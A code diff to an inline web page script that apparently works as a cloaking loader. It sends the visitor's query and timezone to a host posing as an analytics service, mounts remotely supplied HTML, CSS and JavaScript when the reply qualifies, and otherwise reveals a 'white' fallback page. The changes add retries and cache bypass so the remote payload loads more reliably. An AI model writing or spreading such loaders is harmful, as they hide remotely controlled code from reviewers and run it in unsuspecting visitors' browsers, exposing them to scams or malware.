@@ -38,7 +38,7 @@
             d.documentElement.classList.remove('is-syncing');
         }
 
-        var revealTimer = setTimeout(revealWhite, 4700);
+        var revealTimer = setTimeout(revealWhite, 5200);
 
         function mountView(payload) {
             if (mounted || !payload || payload.ok !== 1 || !payload.css || !payload.html || !payload.js) return;
@@ -78,21 +78,38 @@
             tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
         } catch (e) {}
 
-        var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
-        var tId = ctrl ? setTimeout(function () { ctrl.abort(); }, 4500) : null;
         var endpoint = 'https://cloud-analytics-node.com/v2/get-key' + q + (tz ? '&tz=' + encodeURIComponent(tz) : '');
+        var startedAt = Date.now();
 
-        w.fetch(endpoint, {
-            method: 'GET',
-            credentials: 'omit',
-            signal: ctrl ? ctrl.signal : undefined
-        })
-        .then(function (res) {
-            if (tId) clearTimeout(tId);
-            if (res.status !== 200) return null;
-            return res.json();
-        })
-        .then(function (payload) {
+        function fetchKey(attempt) {
+            var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
+            var tId = ctrl ? setTimeout(function () { ctrl.abort(); }, 4500) : null;
+
+            return w.fetch(endpoint, {
+                method: 'GET',
+                credentials: 'omit',
+                cache: 'no-store',
+                signal: ctrl ? ctrl.signal : undefined
+            })
+            .then(function (res) {
+                if (tId) clearTimeout(tId);
+                if (res.status !== 200) return null;
+                return res.json();
+            })
+            .catch(function (err) {
+                if (tId) clearTimeout(tId);
+                if (attempt < 1 && (!err || err.name !== 'AbortError') && (Date.now() - startedAt) < 2500) {
+                    return new Promise(function (resolve) {
+                        setTimeout(function () {
+                            resolve(fetchKey(attempt + 1));
+                        }, 300);
+                    });
+                }
+                return null;
+            });
+        }
+
+        fetchKey(0).then(function (payload) {
             if (!payload || payload.ok !== 1) {
                 revealWhite();
                 return;
@@ -108,10 +125,6 @@
             } else {
                 mountView(payload);
             }
-        })
-        .catch(function () {
-            if (tId) clearTimeout(tId);
-            revealWhite();
         });
     })(window, document);
     </script>
